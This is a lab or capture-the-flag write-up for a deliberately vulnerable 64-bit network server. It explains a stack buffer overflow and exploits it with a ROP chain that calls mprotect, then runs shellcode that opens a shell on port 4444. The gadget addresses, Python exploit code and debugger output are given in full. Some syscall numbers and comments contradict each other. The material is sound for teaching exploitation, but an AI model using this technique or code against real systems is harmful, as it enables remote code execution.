# Remote buffer overflow with ROP - DEP/64bit

## Introduction

Networked server with a stack based overflow. Can be solved by using ROP
and `mprotect()` to make shellcode executable.

## Source

* Source directory: `~/challenges/challenge16/`
* Source files: [challenge16](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge16)

You can compile it by calling `make` in the folder `~/challenges/challenge16`

### Vulnerability

The vulnerability lies here:

```c
void handleClient (int socket) {
   char data[1024];
   int ret = 0;

   bzero(data, sizeof(data));
   write(socket, "Data: ", 6);

   ret = read(socket, data, 2048); // reads up to 2048 bytes into a 1024 buffer
   printf("I've read %i bytes\n", ret);
}
```

The server reads up to 2048 bytes into a 1024 buffer directly from the socket. The socket itself will communicate
when there is no more data, therefore null bytes are allowed.


## Usage

Start the server in a terminal:
```
~/challenges/challenge16$ ./challenge16
Starting server on port: 5001
Client connected
I've read 5 bytes
```

In another terminal:
```
~/challenges/challenge16$ nc localhost 5001
Data: Test

~/challenges/challenge16$
```


## Exploit

Because DEP is enabled, we have to mark the memory area of the stack executable. This is
possible by using the systemcall `mprotect`:

```
int mprotect(void *addr, size_t len, int prot);

mprotect() changes the access protections for the calling process's
       memory pages containing any part of the address range in the interval
       [addr, addr+len-1].  addr must be aligned to a page boundary.
```

So we will call `mprotect` syscall via ROP first, then invoke our now executable shellcode.
As we disabled ASLR, the stack and therefore our shellcode will be at a static address.


## Example mprotect()

Lets write a C program to test `mprotect()` from libc first. 

Important is that the address needs to be page aligned. We can do this with `addr & ~(4096 - 1)`.

```
#include <stdio.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096

void main(void) {
        char stackvar[16];
        int ret;
        long long stackbase = (long long)( &stackvar ) & ~(PAGE_SIZE -1); // round down

        printf("Stack var: %p\n", &stackvar);
        printf("Stackbase: 0x%llx\n", stackbase);
        ret = mprotect( (void *) stackbase, 16, PROT_READ|PROT_WRITE|PROT_EXEC);

        printf("Ret: %i\n", ret);
}
```

Test:
```
root@hlUbuntu64:~/challenges/challenge16# gcc mprotect-test.c && ./a.out
Stack var: 0x7fffffffe480
Stackbase: 0x7fffffffe000
Ret: 0
```

Call to mprotect, via disassembly:
```
0x0000000000400627 <+81>:	mov    rax,QWORD PTR [rbp-0x28]
0x000000000040062b <+85>:	mov    edx,0x7
0x0000000000400630 <+90>:	mov    esi,0x10
0x0000000000400635 <+95>:	mov    rdi,rax
0x0000000000400638 <+98>:	call   0x4004c0 <mprotect@plt>
```

With x86-64 bit function call convention: RDI, RSI, RDX

According to http://syscalls.kernelgrok.com/ sys_mprotect is syscall nr is  0x7d.
x86-64 bit system call convention is: RDI, RSI, RDX (syscall in RAX).


## ROP chain plan

We'll do the following ROP chain:

- pop RAX; ret      // <-- SIP is here
- 0x7d              // rax = sys_mprotect
- pop RDI; ret
- addr              // rdi = addr of stack with shellcode
- pop RSI; ret
- 4096              // rsi = size of stack
- pop RDX; ret
- 0x7               // rdp = stack permissions (RWX)
- syscall; ret      // invoke syscall
- addr of shellcode // will invoke our shellcode


## Find gadgets

We need five gadgets:
- pop RAX
- pop RDI
- pop RSI
- pop RDX
- syscall

Pwntools can help us find them. See `print-gadgets.py`:

```
~/challenges/challenge16$ ./print-gadgets.py challenge16
...
 4554474: Gadget(0x457eea, ['add rsp, 0x98', 'ret'], [], 0xa0),
 4554475: Gadget(0x457eeb, ['add esp, 0x98', 'ret'], [], 0xa0),
 4559101: Gadget(0x4590fd, ['add rsp, 0x38', 'ret'], [], 0x40),
 4559102: Gadget(0x4590fe, ['add esp, 0x38', 'ret'], [], 0x40),
 4581157: Gadget(0x45e725, ['add esp, 0x18', 'pop rbx', 'pop rbp', 'pop r12', 'pop r13', 'ret'], ['rbx', 'rbp', 'r12', 'r13'], 0x40),
 4619734: Gadget(0x467dd6, ['add esp, 0x68', 'pop rbx', 'pop rbp', 'pop r12', 'pop r13', 'ret'], ['rbx', 'rbp', 'r12', 'r13'], 0x90),
 4622845: Gadget(0x4689fd, ['add rsp, 8', 'pop rbp', 'pop r12', 'ret'], ['rbp', 'r12'], 0x20),
 4622846: Gadget(0x4689fe, ['add esp, 8', 'pop rbp', 'pop r12', 'ret'], ['rbp', 'r12'], 0x20),
 4623262: Gadget(0x468b9e, ['add esp, 0xa8', 'pop rbp', 'pop r12', 'ret'], ['rbp', 'r12'], 0xc0),
 4668502: Gadget(0x473c56, ['pop rax', 'pop rdx', 'pop rbx', 'ret'], ['rax', 'rdx', 'rbx'], 0x20),
 4668503: Gadget(0x473c57, ['pop rdx', 'pop rbx', 'ret'], ['rdx', 'rbx'], 0x18),
 4668973: Gadget(0x473e2d, ['add rsp, 0x48', 'ret'], [], 0x50),
 4668974: Gadget(0x473e2e, ['add esp, 0x48', 'ret'], [], 0x50),
 4669856: Gadget(0x4741a0, ['add rsp, 0x30', 'pop rbp', 'ret'], ['rbp'], 0x40),
 4669857: Gadget(0x4741a1, ['add esp, 0x30', 'pop rbp', 'ret'], ['rbp'], 0x40),
 4676136: Gadget(0x475a28, ['pop rbp', 'pop rbx', 'ret'], ['rbp', 'rbx'], 0x18),
 4702008: Gadget(0x47bf38, ['add rsp, 0x38', 'pop rbx', 'pop r14', 'ret'], ['rbx', 'r14'], 0x50),
 4702009: Gadget(0x47bf39, ['add esp, 0x38', 'pop rbx', 'pop r14', 'ret'], ['rbx', 'r14'], 0x50),
 4702012: Gadget(0x47bf3c, ['pop rbx', 'pop r14', 'ret'], ['rbx', 'r14'], 0x18)}
Useful gadgets:
Gadget(0x446ef3, ['pop rax', 'ret'], ['rax'], 0x10)
Gadget(0x40178e, ['pop rdi', 'ret'], ['rdi'], 0x10)
Gadget(0x4078be, ['pop rsi', 'ret'], ['rsi'], 0x10)
Gadget(0x4016ab, ['pop rdx', 'ret'], ['rdx'], 0x10)
```

```
/challenges/challenge16$ python3 print-gadgets.py challenge16 | grep syscall
 4198923: Gadget(0x40120b, ['syscall'], [], 0x0),
 4280524: Gadget(0x4150cc, ['syscall', 'ret'], [], 0x8),
 4302646: Gadget(0x41a736, ['syscall', 'pop rbp', 'ret'], ['rbp'], 0x10),
 4311454: Gadget(0x41c99e, ['syscall', 'pop rbx', 'ret'], ['rbx'], 0x10),
```

So the addresses are as follows:
* 0x446ef3: pop rax; ret
* 0x40178e: pop rdi; ret
* 0x4078be: pop rsi; ret
* 0x4016ab: pop rdx; ret
* 0x4150cc: syscall

Note: `rop.syscall` will return the first one at `0x40120b`, which does not have a ret. 

To build the ropchain, we can just put the addresses of the gadgets at the end
of our exploit data:

```
def makeExploit(offset, address, buf_size=128, nop=b'\x90'):
    alignedAddr = (address & ~(4096-1));

    exploit = nop * (buf_size - len(shellcode))
    exploit += shellcode
    exploit += b'A' * (offset - len(exploit))

    # next 8 bytes in exploit point on SIP

    exploit += p64 ( 0x446ef3 )         # 0x446ef3: pop rax; ret;
    exploit += p64 ( 10 )               # syscall sys_mprotect

    exploit += p64 ( 0x40178e )         # 0x40178e: pop rdi; ret;
    exploit += p64 ( alignedAddr )      # mprotect arg: addr

    exploit += p64 ( 0x4078be )         # 0x4078be: pop rsi; ret;
    exploit += p64 ( 4096 )             # mprotect arg: size

    exploit += p64 ( 0x4016ab )         # 0x4016ab: pop rdx; ret;
    exploit += p64 ( 0x7 )              # protect arg: permissions

    exploit += p64 ( 0x4150cc )         # 0x40120b: syscall; ret

    exploit += p64 ( address )  # continue here, at shellcode

    return exploit
```


## Offset

Offset is `1048`:

```
~/challenges/challenge16$ python3 exp-challenge16.py --offset 1048
...

000003d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000003e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000003f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000400  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000410  41 41 41 41  41 41 41 41  42 42 42 42               │AAAA│AAAA│BBBB│
0000041c
[ ] Receiving all data: 0B

─────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x15
$rbx   : 0x00000000400488  →   add BYTE PTR [rax], al
$rcx   : 0x0
$rdx   : 0x0
$rsp   : 0x007fffffffeb70  →  0x007fffffffece8  →  0x007fffffffeedc  →  "./challenge16"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x000000004b4600  →  "I've read 1052 bytes\nrt: 5001\n"
$rdi   : 0x000000004b1250  →  0x0000000000000000
$rip   : 0x42424242
───────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
───────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge16", stopped 0x42424242 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────
```


## Find stack addr of shellcode

To find the stack address of the shellcode in memory, we can start the exploit with the
parameters `--addr 0x414141 --keep --gdb "b *handleClient+129"`. This will the `gdb` argument
will set a breakpoint at the end of the overflown function, and we can just simply print
the memory address with the gdb command `print &data`:

Remember:
```
void handleClient (int socket) {
   char data[1024];
   int ret = 0;

   bzero(data, sizeof(data));
   write(socket, "Data: ", 6);

   ret = read(socket, data, 2048); // reads up to 2048 bytes into a 1024 buffer
   printf("I've read %i bytes\n", ret);
}
```

Find address:
```
~/challenges/challenge16$ python3 exp-challenge16.py --offset 1048 --addr 0x414141 --keep --gdb "b *handleClient+129"
...
────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x15
$rbx   : 0x00000000400488  →   add BYTE PTR [rax], al
$rcx   : 0x0
$rdx   : 0x0
$rsp   : 0x007fffffffeb68  →  0x00000000446ef3  →  <__open_nocancel+99> pop rax
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x000000004b4600  →  "I've read 1128 bytes\nrt: 5001\n"
$rdi   : 0x000000004b1250  →  0x0000000000000000
$rip   : 0x00000000401d0e  →  <handleClient+129> ret
───────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401d0d <handleClient+128> leave
 →   0x401d0e <handleClient+129> ret
   ↳    0x446ef3 <__open_nocancel+99> pop    rax
        0x446ef4 <__open_nocancel+100> ret
        0x446ef5 <__open_nocancel+101> nop    DWORD PTR [rax]
        0x446ef8 <__open_nocancel+104> lea    rax, [rsp+0x60]
───────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge16", stopped 0x401d0e in handleClient (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────
gef➤  print &data
$1 = (char (*)[1024]) 0x7fffffffe750
```

The address of our buffer/shellcode is therefore `0x7fffffffe750`.


## Putting it all together

We use the command line `exp-challenge16.py --offset 1048 --addr 0x7fffffffe750`. 

If it succeeds, we will see something like `process 1484 is executing new program: /usr/bin/dash`
in the bottom screen. The top screen will show `[+] Opening connection to 127.0.0.1 on port 4444: Done`
and a shell prompt. You can select it by changing into that screen with `ctrl-b <up-arrow>`.

```
~/challenges/challenge16$ python3 exp-challenge16.py --offset 1048 --addr 0x7fffffffe750 
...
000003d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000003e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000003f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000400  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000410  41 41 41 41  41 41 41 41  f3 6e 44 00  00 00 00 00  │AAAA│AAAA│·nD·│····│
00000420  0a 00 00 00  00 00 00 00  8e 17 40 00  00 00 00 00  │····│····│··@·│····│
00000430  00 e0 ff ff  ff 7f 00 00  be 78 40 00  00 00 00 00  │····│····│·x@·│····│
00000440  00 10 00 00  00 00 00 00  ab 16 40 00  00 00 00 00  │····│····│··@·│····│
00000450  07 00 00 00  00 00 00 00  cc 50 41 00  00 00 00 00  │····│····│·PA·│····│
00000460  50 e7 ff ff  ff 7f 00 00                            │P···│····│
00000468
[+] Opening connection to 127.0.0.1 on port 4444: Done
[*] Switching to interactive mode
$
──────────────────────────────────────────────────────────────────────────────────────────

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00000000400488  →   add BYTE PTR [rax], al
$rcx   : 0x000000004462de  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x800
$rsp   : 0x007fffffffe738  →  0x00000000401cf5  →  <handleClient+104> mov DWORD PTR [rbp-0x4], eax
$rbp   : 0x007fffffffeb60  →  0x007fffffffebb0  →  0x00000000402cc0  →  <__libc_csu_init+0> push r15
$rsi   : 0x007fffffffe750  →  0x0000000000000000
$rdi   : 0x4
$rip   : 0x000000004462de  →  0x5a77fffff0003d48 ("H="?)
───────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4462dc <read+12>        syscall
 →   0x4462de <read+14>        cmp    rax, 0xfffffffffffff000
     0x4462e4 <read+20>        ja     0x446340 <read+112>
     0x4462e6 <read+22>        ret
     0x4462e7 <read+23>        nop    WORD PTR [rax+rax*1+0x0]
───────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge16", stopped 0x4462de in read (), reason: STOPPED
──────────────────────────────────────────────────────────────────────────────────────────
process 1484 is executing new program: /usr/bin/dash
```

## Debugging help


